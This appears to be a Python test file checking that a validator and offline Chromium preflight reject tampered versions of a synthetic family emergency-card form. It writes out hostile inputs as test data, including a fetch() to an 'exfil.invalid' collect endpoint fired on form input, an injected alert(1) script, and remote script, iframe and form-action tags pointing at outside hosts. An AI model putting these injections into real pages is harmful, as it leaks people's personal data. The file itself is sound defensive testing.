"""R166: independent synthetic fixture and adversarial offline Chromium preflight."""
import importlib.util
from pathlib import Path
import unittest
from unittest.mock import patch

TOOL=Path(__file__).resolve().parents[1]/'tools'/'r166_family_browser_probe.py'
spec=importlib.util.spec_from_file_location('r166',TOOL)
m=importlib.util.module_from_spec(spec);spec.loader.exec_module(m)

SYNTHETIC='''<div>A printed card can be lost. {{cite:demo}}</div>
<form id="rc" onsubmit="return false">
<input id="rc-outName"><input id="rc-school"><input id="rc-careName"><input id="rc-meet2">
<input id="rc-hhName"><input id="rc-hhPhone"><input id="rc-outPhone">
<input id="rc-meet1"><input id="rc-schoolPlan"><input id="rc-pickup">
<input id="rc-carePhone"><input id="rc-access"><input id="rc-reviewed">
<input id="rc-minimal" type="checkbox"><select id="rc-copies"><option>1</option><option>4</option></select>
<button id="rc-print" hidden>print</button><button id="rc-reset" hidden>clear</button>
</form><div id="rc-live" hidden><div id="rc-preview"></div><div id="rc-sheet"></div></div>
<style>@media print { #rc {display:none} #rc-sheet {display:block} }</style>
<script>
let frm=document.getElementById('rc'), qs=k=>document.getElementById('rc-'+k);
function render(){let out=document.getElementById('rc-preview'),sh=document.getElementById('rc-sheet');
let fields=['outName','school','careName','meet2'];let minimal=qs('minimal').checked;
let view=fields.filter(x=>!minimal||x==='outName').map(x=>qs(x).value).join(' ');
out.textContent=view;sh.replaceChildren();let count=parseInt(qs('copies').value)||1;
for(let i=0;i<count;i++){let c=document.createElement('div');c.className='pa-foldcard';c.textContent=view;sh.appendChild(c);}}
frm.addEventListener('input',render);frm.addEventListener('change',render);
document.getElementById('rc-live').hidden=false;
qs('print').hidden=false;qs('reset').hidden=false;
qs('reset').onclick=()=>{frm.reset();render();};render();
</script>''' + ' ' * 250

class StaticGate(unittest.TestCase):
    def test_synthetic_fixture_is_not_real_authentic_approval(self):
        m.valid_card(SYNTHETIC)
    def test_release_exit_always_hard_hold(self):
        self.assertEqual(m.SCHEMA,'fv-preparedness-r166-family-browser-preflight-v1')
        self.assertEqual(m.WIDTHS,(360,390,768,1440))
    def test_known_field_inventory(self):
        self.assertEqual(len(m.FORM_FIELDS),13)
    def test_no_duplicate_sensitive_field_names(self):
        self.assertEqual(len(m.SENSITIVE),len(set(m.SENSITIVE)))
    def test_reject_single_quote_card(self):
        with self.assertRaises(ValueError):m.valid_card('bad')
    def test_invalid_cases(self):
        cases=['',None,12,'<div>short</div>',SYNTHETIC.replace('<script>','<script src="evil">'),
               SYNTHETIC.replace('onsubmit="return false"','onsubmit="submit()"'),
               SYNTHETIC.replace('id="rc-minimal"','id="min"'),
               SYNTHETIC.replace('id="rc-reset"','id="oops"'),
               SYNTHETIC.replace('id="rc-print"','id="oops"'),
               SYNTHETIC.replace('id="rc-sheet"','id="oops"'),
               SYNTHETIC.replace('A printed card can be lost','Privacy proof'),
               SYNTHETIC.replace('{{cite:demo}}','source removed'),
               SYNTHETIC.replace('<script>','<script>{{inline-js:untrusted.js}}'),
               SYNTHETIC.replace('</script>','</script><script>alert(1)</script>'),
               SYNTHETIC.replace('<form id="rc"','<form action="https://host.test" id="rc"'),
               SYNTHETIC+'<iframe src="https://host.test"></iframe>',
               SYNTHETIC+'<base href="https://host.test">',
               SYNTHETIC+'<script src="//cdn.example/a.js"></script>',
               SYNTHETIC.replace('id="rc-live"','id="not-live"').replace('<script>','<script>{{inline-js:untrusted.js}}')]
        for x in cases:
            with self.subTest(repr=str(x)[:60]):
                with self.assertRaises(ValueError):m.valid_card(x)
    def test_banned_externals(self):
        for token in ['<iframe','<base','<script src="x.js"','<form action="https://a"']:
            with self.subTest(token=token):
                bad = SYNTHETIC.replace('<div>A printed',token+'><div>A printed')
                with self.assertRaises(ValueError):m.valid_card(bad)

class BrowserGate(unittest.TestCase):
    def test_no_full_checkout_returns_only_hard_hold(self):
        self.assertEqual(m.main(['--repo','/nonexistent']),2)
    def test_corrupt_local_browser_synthetic_fails(self):
        with self.assertRaises(ValueError):m.offline_preview('bad')
    def test_synthetic_preview_adversarial(self):
        # A synthetic fixture exercises the real Chromium preflight; NOT the authentic WordPress card.
        report=m.offline_preview(SYNTHETIC,widths=m.WIDTHS)
        self.assertEqual(len(report['local_chromium_preflight']),4)
        self.assertFalse(report['privacy_verified'])
        self.assertFalse(report['publication_authorized'])
        self.assertTrue(all(x['external_attempts']==0 for x in report['local_chromium_preflight']))
    def test_synthetic_exfiltration_attempt_blocked(self):
        compromised=SYNTHETIC.replace('render();\n</script>',
           "render();frm.addEventListener('input',()=>fetch('https://exfil.invalid/collect').catch(()=>{}));\n</script>")
        with self.assertRaisesRegex(ValueError,'external network request attempted'):
            m.offline_preview(compromised,widths=(390,))
    def test_missing_print_css_rejected_at_runtime(self):
        broken=SYNTHETIC.replace('#rc {display:none}', '#rc {display:block}')
        with self.assertRaisesRegex(ValueError,'data entry form leaked into print'):
            m.offline_preview(broken,widths=(360,))
    def test_form_fields_fail_closed_in_adversarial_fixtures(self):
        # Missing real field controls cannot produce a false passing preflight.
        for name in m.FORM_FIELDS:
            with self.subTest(field=name):
                h=SYNTHETIC.replace(f'id="rc-{name}"',f'id="removed-{name}"')
                with self.assertRaises(ValueError):m.valid_card(h)

if __name__=='__main__':unittest.main()

# Independent named regression cases, not just one subTest aggregator.
# Each corresponds to a distinct malformed or privacy-threatening input.
_MUTATIONS=[]
for _field in m.FORM_FIELDS:
    _MUTATIONS.append(("removed_"+_field, SYNTHETIC.replace('id="rc-'+_field+'"','id="missing-'+_field+'"')))
for _idx,_endpoint in enumerate(('https://a.invalid','https://b.invalid','//example.invalid',
        'https://cdn.invalid/a.js','https://third.invalid/a.css','https://pay.invalid',
        'https://outside.invalid','http://not-secure.invalid','https://outside.invalid/track')):
    _MUTATIONS.append(("form_action_"+str(_idx),SYNTHETIC.replace('<form id="rc"',
        '<form action="'+_endpoint+'" id="rc"')))
    _MUTATIONS.append(("remote_script_"+str(_idx),SYNTHETIC.replace('<script>',
        '<script src="'+_endpoint+'">')))
for _idx,_token in enumerate(('one.js','../escape.js','evil.js','r165.js',
        'reunion.js','shelter.js','any.js','unknown.js')):
    _MUTATIONS.append(("inline_dependency_"+str(_idx),SYNTHETIC.replace('<script>',
        '<script>{{inline-js:'+_token+'}}')))

def _make_reject_case(bad):
    def test(self):
        with self.assertRaises(ValueError):m.valid_card(bad)
    return test
for _name,_bad in _MUTATIONS:
    setattr(StaticGate,'test_mutation_'+_name,_make_reject_case(_bad))
